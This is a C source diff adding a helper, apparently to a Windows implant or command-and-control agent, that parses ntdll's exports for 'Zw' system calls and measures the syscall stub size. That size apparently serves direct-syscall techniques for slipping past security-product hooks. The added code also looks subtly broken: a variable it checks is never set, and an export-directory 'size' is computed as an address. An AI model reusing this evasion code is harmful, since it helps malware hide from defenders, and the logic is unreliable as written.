@@ -432,6 +432,80 @@ PVOID LdrFunctionAddr(
     return NULL;
 }
 
+/*
+ * Get the size of an NtApi by finding two consecutive syscalls
+ * and returning the difference of their addresses.
+ * This can't be static because it changes between releases.
+ */
+UINT32 GetSyscallSize(
+    VOID
+) {
+    PVOID                   Module           = Instance.Modules.Ntdll;
+    PIMAGE_NT_HEADERS       NtHeader         = { 0 };
+    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = { 0 };
+    SIZE_T                  ExpDirectorySize = { 0 };
+    PDWORD                  AddrOfFunctions  = { 0 };
+    PDWORD                  AddrOfNames      = { 0 };
+    PWORD                   AddrOfOrdinals   = { 0 };
+    PVOID                   FunctionAddr     = { 0 };
+    PCHAR                   FunctionName     = { 0 };
+    ANSI_STRING             AnsiString       = { 0 };
+    PVOID                   Addr1            = NULL;
+    PVOID                   Addr2            = NULL;
+    UINT32                  SyscallSize      = 0;
+    UINT32                  Offset           = 0;
+
+    if ( ! Module )
+        return 0;
+
+    if ( Instance.Syscall.Size )
+        return Instance.Syscall.Size;
+
+    NtHeader         = C_PTR( Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew );
+    ExpDirectory     = C_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress );
+    ExpDirectorySize = U_PTR( Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size );
+
+    AddrOfNames      = C_PTR( Module + ExpDirectory->AddressOfNames );
+    AddrOfFunctions  = C_PTR( Module + ExpDirectory->AddressOfFunctions );
+    AddrOfOrdinals   = C_PTR( Module + ExpDirectory->AddressOfNameOrdinals );
+
+    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
+    {
+        /* ignore redirect functions */
+        if ( ( ULONG_PTR ) FunctionAddr >= ( ULONG_PTR ) ExpDirectory &&
+             ( ULONG_PTR ) FunctionAddr <  ( ULONG_PTR ) ExpDirectory + ExpDirectorySize )
+            continue;
+
+        // make sure is a system call
+        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
+        if (*(USHORT*)FunctionName != 0x775a)
+            continue;
+
+        // save one random syscall addr
+        if ( ! Addr1 )
+        {
+            Addr1 = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            continue;
+        }
+        else
+        {
+            // get the distance between our saved syscall addr and this one
+            Addr2  = C_PTR( Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ] );
+            Offset = ( ULONG_PTR ) Addr1 > ( ULONG_PTR ) Addr2 ? ( ULONG_PTR ) Addr1 - ( ULONG_PTR ) Addr2 : ( ULONG_PTR ) Addr2 - ( ULONG_PTR ) Addr1;
+
+            // if the distance is the smallest we have seen so far, save it
+            if ( ! SyscallSize || Offset < SyscallSize ) {
+                SyscallSize = Offset;
+            }
+        }
+    }
+
+    // by now, we should have the size of a syscall stub
+    Instance.Syscall.Size = SyscallSize;
+
+    return Instance.Syscall.Size;
+}
+
 /*!
  * opens a handle to the specified pid with specified access
  * @param ProcessID
